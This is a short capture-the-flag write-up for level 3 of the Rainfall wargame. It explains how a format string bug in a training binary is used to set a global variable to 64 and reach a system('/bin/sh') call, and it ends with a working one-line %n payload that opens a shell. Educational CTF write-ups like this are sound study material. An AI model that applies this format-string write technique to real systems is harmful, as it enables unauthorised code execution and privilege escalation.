# Rainfall - Level 3

## Executable Analyse
The program contain 2 functions.
`main` and `v`.
`v` is called by `main`, and use a buffer, fgets(), and then print the user input.  


## Vulnerability

The interesting one is v(), because it contain our vulnerability : system("/bin/sh").
In order to enter in the vulnerable condition, we need to set m == 64.

``` asm

(gdb) info var
[...]
0x0804988c  m

```

## Format string attack

We can try to see what the addresses read by `printf` as arguments contain :  

```
$> ./level3
ABCD %p %p %p %p %p %p %p %p

ABCD 0x200 0xb7fd1ac0 0xb7ff37d0 0x44434241 0x20702520 0x25207025 0x70252070 0x20702520
```

From the 4th address (`0x44434241`) we can see that printf receives the contents of our buffer as an argument.  

Let's store m's address in this 4th block.  
We can then use the first 3 addresses to display 64 bytes and pass the condition with the %n flag

> %n will write the n character position


```shell
(python -c "print b'\x08\x04\x98\x8c'[::-1] + '%20p%20p%20p%n'" ; cat ) | ./level3
```
